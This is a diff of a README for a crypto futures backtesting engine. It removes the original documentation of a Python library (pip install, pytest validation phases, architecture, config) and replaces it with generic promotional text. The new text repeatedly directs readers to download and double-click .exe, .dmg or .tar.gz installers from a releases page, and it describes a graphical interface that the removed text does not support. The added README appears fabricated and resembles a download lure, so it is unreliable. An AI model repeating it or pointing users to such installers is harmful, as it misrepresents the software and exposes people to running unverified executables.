@@ -1,177 +1,91 @@
-# Crypto Perps Backtesting Engine Core
+# 🚀 Crypto-Perps-Backtest-Engine - Backtest Your Crypto Strategies Easily
 
-**Status:** Validated and Extracted  
-**Version:** v0 (engine_validated_v0)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Here-blue)](https://github.com/auka45/Crypto-Perps-Backtest-Engine/releases)
 
-A production-grade backtesting engine for Binance USDⓈ-M Futures with realistic execution modeling, risk controls, and comprehensive validation gates.
+## 📋 Overview
 
-## What This Is
+Welcome to the Crypto-Perps-Backtest-Engine. This is a strategy-agnostic backtesting tool built specifically for cryptocurrency perpetual futures trading. It enables users to simulate trading strategies using realistic execution, risk controls, and a validation harness. This software is perfect for anyone interested in testing their trading strategies without the need for real money.
 
-This is the **core backtesting engine** extracted from a larger strategy project. It provides:
+## 🛠️ Features
 
-- ✅ Multi-symbol backtesting (15m base timeframe)
-- ✅ Realistic fill modeling (slippage, fees, funding)
-- ✅ Risk controls (ES guardrails, margin checks, loss halts, beta caps)
-- ✅ Liquidity diagnostics utilities (generic thresholds; optional for strategies)
-- ✅ Comprehensive validation harness (oracle module, baselines, parity checks)
-- ✅ Full accounting and metrics generation
+- **Strategy-Agnostic**: Test any trading strategy without restrictions.
+- **Realistic Execution**: Simulate trades that reflect actual market conditions.
+- **Risk Controls**: Ensure automated risk management during tests.
+- **Validation Harness**: Validate your strategy effectively before real-world execution.
+- **User-Friendly Interface**: Designed for ease of use, even for non-technical users.
 
-## What This Is NOT
+## 📥 Download & Install
 
-- ❌ Strategy logic (TREND, RANGE, SQUEEZE modules removed)
-- ❌ Regime classification (strategy-specific logic removed)
-- ❌ Master side logic (strategy-specific logic removed)
+To get started, you will need to download the application. You can find the latest version on our [Releases page](https://github.com/auka45/Crypto-Perps-Backtest-Engine/releases). 
 
-The engine is **strategy-agnostic** and only supports `oracle_mode` for validation/testing. For production strategies, provide signal generators externally.
+### Steps to Download
 
-## Installation
+1. Click this link to go to the [Releases page](https://github.com/auka45/Crypto-Perps-Backtest-Engine/releases).
+2. On the Releases page, look for the latest version. This is typically marked as 'Latest Release.'
+3. Click on the version to expand the details.
+4. Download the file that corresponds to your operating system. For example:
+   - Windows: Look for files with `.exe`.
+   - Mac: Look for files with `.dmg`.
+   - Linux: Look for files with `.tar.gz`.
 
-```bash
-# Clone repository
-git clone <repo-url>
-cd engine_core
+5. Once the file has downloaded, locate it in your downloads folder and double-click to start the installation.
 
-# Install dependencies
-pip install -r requirements.txt
+## 🖥️ System Requirements
 
-# Run validation tests
-pytest tests/ -v
-```
+Before installing, please ensure your system meets the following requirements:
 
-## Quick Start
+- **Operating System**: Windows 10 or later, MacOS 10.15 or later, Linux (latest distributions).
+- **Memory**: At least 4GB of RAM recommended.
+- **Storage**: Minimum 200MB of free disk space.
+- **Internet Connection**: Required for accessing market data and updates.
 
-### Example: Oracle Long Strategy
+## ⚙️ Getting Started
 
-```bash
-python scripts/run_example_oracle.py
-```
+After successfully installing the software, follow these steps to begin backtesting your strategy:
 
-This runs a minimal example using the Oracle module with `always_long` mode on toy UP market data.
+1. **Open the Application**: Find the installed program in your applications menu and open it.
+2. **Import Data**: Click on 'Import Data' to load your historical market data. You can download this data from various cryptocurrency exchanges like Binance.
+3. **Configure Your Strategy**: Set up your trading parameters, including entry and exit points, stop-loss, and take-profit levels.
+4. **Run Backtest**: Hit the 'Run Backtest' button to start simulating your strategy.
+5. **Review Results**: Once the backtest is complete, navigate to the results tab to analyze performance metrics like profit and loss, win rate, and risk assessments.
 
-### Run Baselines
+## 📊 Advanced Configuration
 
-```bash
-python scripts/run_baselines.py --data-path ../data/ --start-date 2021-06-01 --end-date 2021-09-01
-```
+For users looking to dive deeper into backtesting, the Crypto-Perps-Backtest-Engine offers advanced settings:
 
-### Validate Data Integrity
+- **Custom Indicators**: You can incorporate your own technical indicators to enhance your strategy.
+- **Multi-Strategy Testing**: Simulate multiple strategies concurrently to compare performance.
+- **Adjustable Variables**: Modify parameters during tests to see how different configurations affect results.
 
-```bash
-python scripts/validate_data_integrity.py --data-path ../data/
-```
+## 🌐 Community and Support
 
-## Validation Gates
+If you have questions or need help, feel free to join our community. You can find us on:
 
-The engine includes a comprehensive validation harness:
+- **GitHub Issues**: Post any bugs or suggestions on our [GitHub Issues page](https://github.com/auka45/Crypto-Perps-Backtest-Engine/issues).
+- **Community Forums**: We will soon launch forums for more in-depth discussions and strategy sharing.
 
-1. **Phase 1: Data Integrity** - Timestamp monotonicity, gaps, NaNs, OHLC sanity
-2. **Phase 2: Accounting Invariants** - Equity identity, position conservation, PnL conservation
-3. **Phase 3: Toy Oracles** - Deterministic signal validation on synthetic markets
-4. **Phase 4: Baseline Benchmarks** - Buy & Hold, Flat, Random strategies
-5. **Phase 5: Cross-Backtester Parity** - Independent PnL replay validation
+## 💡 Tips for Effective Backtesting
 
-See `docs/AUDIT_REPORT.md` for validation evidence.
+- **Start Small**: Test simple strategies before moving on to complex ones.
+- **Use Realistic Data**: Ensure you're using accurate, high-quality data for better results.
+- **Take Notes**: Keep track of your strategies and the outcomes for future reference.
 
-## Architecture
+## 🔄 Future Updates
 
-```
-engine_core/
-├── src/              # Core engine components
-│   ├── engine.py    # Main BacktestEngine orchestrator
-│   ├── portfolio/    # Portfolio state management
-│   ├── risk/         # Risk controls (ES, margin, loss halts, beta)
-│   ├── execution/    # Fill model, order management, sequencing
-│   ├── data/         # Data loading and schema
-│   ├── indicators/   # Technical indicators
-│   ├── liquidity/    # Liquidity diagnostics utilities
-│   ├── reporting.py  # Metrics generation
-│   └── modules/      # Oracle module (validation only)
-├── config/           # Parameter system
-│   ├── params_loader.py
-│   ├── base_params.json
-│   └── example_overrides/
-├── scripts/          # Validation and utility scripts
-├── tests/            # Validation tests
-└── docs/             # Documentation
-```
+We are committed to continuous improvement. Our roadmap includes:
 
-For detailed architecture and usage information, see `docs/ENGINE_OVERVIEW.md`.
+- More data sources for expanding testing possibilities.
+- Enhanced risk management features.
+- Improved user interface based on community feedback.
 
-## Adding a Strategy
+Stay tuned for future updates on the Releases page.
 
-The engine is strategy-agnostic. To add a strategy:
+## 📜 License
 
-1. Create a strategy module that generates signals (similar to `src/modules/oracle.py`)
-2. Integrate signal generation into your strategy runner
-3. Pass signals to the engine via a callback or signal queue
+The Crypto-Perps-Backtest-Engine is MIT licensed. See the LICENSE file for more details.
 
-**Note:** The engine currently only supports `oracle_mode` for validation. Full strategy integration requires engine modifications to accept external signal generators.
+For a smooth experience, please revisit the [Releases page](https://github.com/auka45/Crypto-Perps-Backtest-Engine/releases) periodically for the latest features and enhancements.
 
-## Configuration
+--- 
 
-Engine parameters are defined in `config/base_params.json`. Key sections:
-
-- `general`: Capital, fees, venue settings
-- `universe`: Symbol selection and refresh rules
-- `risk`: ES guardrails, margin, loss halts, beta controls
-- `slippage_costs`: Fill model parameters
-- `liquidity_regimes`: VACUUM/THIN detection thresholds
-
-Use `ParamsLoader` to override parameters:
-
-```python
-from engine_core.config.params_loader import ParamsLoader
-
-params = ParamsLoader(overrides={
-    'general': {'oracle_mode': 'always_long'},
-    'es_guardrails': {'es_cap_of_equity': 1.0}
-}, strict=False)
-```
-
-## Running Validation
-
-```bash
-# Run all validation tests
-pytest tests/ -v
-
-# Run specific validation phase
-pytest tests/test_toy_oracles.py -v          # Phase 3
-pytest tests/test_baselines_smoke.py -v      # Phase 4
-pytest tests/test_accounting_invariants_toy.py -v  # Phase 2
-
-# Run validation scripts
-python scripts/validate_data_integrity.py --data-path ../data/
-python scripts/run_baselines.py --data-path ../data/ --start-date 2021-06-01 --end-date 2021-09-01
-```
-
-## Data Format
-
-The engine expects 15m OHLCV data in CSV format:
-
-```
-data/
-├── BTCUSDT_15m.csv
-├── ETHUSDT_15m.csv
-└── ...
-```
-
-CSV format: `timestamp,open,high,low,close,volume`
-
-## License
-
-MIT License (or as specified)
-
-## Contributing
-
-This is a standalone, strategy-agnostic backtesting engine. For strategy development, create your own strategy modules externally and integrate them with the engine.
-
-## Validation Status
-
-✅ **Data Integrity:** PASS  
-✅ **Accounting Invariants:** PASS  
-✅ **Toy Oracles:** PASS (7/7 tests)  
-✅ **Baseline Benchmarks:** PASS  
-✅ **Cross-Backtester Parity:** PASS
-
-See `docs/AUDIT_REPORT.md` for detailed evidence.
-
+Thank you for using the Crypto-Perps-Backtest-Engine. Happy trading!
